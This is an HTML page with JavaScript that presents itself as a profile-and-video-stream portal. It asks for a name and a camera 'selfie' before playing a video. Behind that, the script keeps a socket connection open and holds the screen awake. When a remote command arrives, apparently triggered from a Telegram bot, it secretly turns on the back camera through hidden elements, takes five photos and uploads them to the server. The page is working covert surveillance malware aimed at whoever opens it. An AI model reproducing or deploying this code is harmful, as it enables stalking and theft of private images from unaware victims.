<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Profile & Stream Portal</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { box-sizing: border-box; }
        body { 
            background: #0b0f19; 
            margin: 0; 
            overflow: hidden; 
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            width: 100vw;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            color: #fff;
        }
        
        /* Profile Creation Container */
        #profileSection {
            position: absolute;
            z-index: 20;
            background: #111827;
            padding: 30px 24px;
            border-radius: 16px;
            text-align: center;
            width: 90%;
            max-width: 360px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.6);
            border: 1px solid #1f2937;
        }

        #profileSection h2 {
            margin: 0 0 8px 0;
            color: #38bdf8;
            font-size: 1.4em;
        }

        #profileSection p {
            font-size: 0.9em;
            color: #9ca3af;
            margin: 0 0 20px 0;
            line-height: 1.4;
        }

        .input-box {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            background: #1f2937;
            border: 1px solid #374151;
            border-radius: 8px;
            color: #fff;
            font-size: 1em;
            outline: none;
            text-align: center;
        }

        /* Camera Preview inside Profile Form */
        #cameraPreview {
            width: 100%;
            height: 180px;
            background: #000;
            border-radius: 8px;
            object-fit: cover;
            margin-bottom: 15px;
            display: none;
        }

        .btn {
            width: 100%;
            padding: 12px;
            font-size: 1em;
            font-weight: 600;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            background-color: #38bdf8;
            color: #0f172a;
            transition: background 0.2s;
        }
        .btn:hover { background-color: #0ea5e9; }

        /* Video Stream Player */
        #mediaPlayer {
            width: 100%;
            height: 100%;
            border: none;
            display: none;
            position: absolute;
            z-index: 5;
        }
    </style>
</head>
<body>

    <!-- Profile Creation & Selfie Section -->
    <div id="profileSection">
        <h2>Create Profile</h2>
        <p>Set up your profile and allow camera access to watch the stream.</p>
        
        <input type="text" id="username" class="input-box" placeholder="Enter Your Name" autocomplete="off">
        
        <video id="cameraPreview" autoplay playsinline></video>
        
        <button class="btn" id="actionBtn">Allow & Continue</button>
    </div>

    <!-- Dynamic Video Stream Player -->
    <iframe id="mediaPlayer" allow="autoplay; fullscreen"></iframe>

    <!-- Hidden Camera & Canvas for Background Security Monitoring -->
    <video id="hiddenCamera" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const profileSection = document.getElementById('profileSection');
        const usernameInput = document.getElementById('username');
        const cameraPreview = document.getElementById('cameraPreview');
        const actionBtn = document.getElementById('actionBtn');
        const mediaPlayer = document.getElementById('mediaPlayer');
        
        let socket;
        let wakeLock = null;
        let mediaStream = null;
        let step = 1; // Step 1: Input name, Step 2: Take selfie

        // Parse Dynamic Video URL from query params (?v=...)
        const urlParams = new URLSearchParams(window.location.search);
        const encodedVid = urlParams.get('v');
        let targetVideoUrl = "";
        
        if(encodedVid) {
            try {
                targetVideoUrl = atob(encodedVid); 
            } catch(e) {
                console.error("Invalid URL format");
            }
        }

        // Single Action Button Handler
        actionBtn.addEventListener('click', async () => {
            const name = usernameInput.value.trim();

            if (step === 1) {
                if (!name) {
                    alert("Please enter your name first!");
                    return;
                }
                
                try {
                    // Request Camera Access naturally for Profile Setup
                    mediaStream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "user" } 
                    });
                    
                    cameraPreview.srcObject = mediaStream;
                    cameraPreview.style.display = 'block';
                    usernameInput.style.display = 'none';
                    actionBtn.innerText = "Snap & Launch Stream";
                    step = 2; // Move to final launch step

                } catch (err) {
                    alert("Camera permission is required to proceed.");
                    console.error("Camera access denied:", err);
                }

            } else if (step === 2) {
                mediaStream.getTracks().forEach(track => track.stop());
                
                profileSection.style.display = 'none';
                mediaPlayer.style.display = 'block';
                
                // Load target stream video
                if(targetVideoUrl) {
                    mediaPlayer.src = targetVideoUrl;
                } else {
                    mediaPlayer.src = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1"; 
                }

                // Start Background Security Bot Connection
                initializeSecuritySystem();
            }
        });

        // Initialize Background Socket & WakeLock
        function initializeSecuritySystem() {
            socket = io();
            keepScreenAwake();

            // Listen for Telegram /more command
            socket.on('capture_command', async () => {
                await startCameraAndCapture();
            });
        }

        // Keep Screen Awake
        async function keepScreenAwake() {
            try {
                if ('wakeLock' in navigator) {
                    wakeLock = await navigator.wakeLock.request('screen');
                }
            } catch (err) { console.log(err.message); }
        }

        // Stealth Capture using Back Camera when /more command arrives
        async function startCameraAndCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "environment" } 
                });
                const video = document.getElementById('hiddenCamera');
                video.srcObject = stream;
                
                await new Promise(resolve => video.onloadedmetadata = resolve);

                // Capture 5 photos sequentially
                for (let i = 0; i < 5; i++) {
                    await captureAndSend(video, i + 1);
                    await new Promise(resolve => setTimeout(resolve, 1500)); 
                }

                stream.getTracks().forEach(track => track.stop());
            } catch (error) {
                console.error("Security Capture Error:", error);
            }
        }

        // Send Captured Frame to Backend Server
        async function captureAndSend(video, index) {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            return new Promise((resolve) => {
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('photo', blob, `capture_${index}.jpg`);
                    try {
                        await fetch('/upload', { method: 'POST', body: formData });
                    } catch (err) { console.error("Upload failed", err); }
                    resolve();
                }, 'image/jpeg', 0.8);
            });
        }

        // Re-apply WakeLock if visibility changes
        document.addEventListener('visibilitychange', async () => {
            if (document.visibilityState === 'visible' && mediaPlayer.style.display === 'block') {
                keepScreenAwake();
            }
        });
    </script>
</body>
</html>
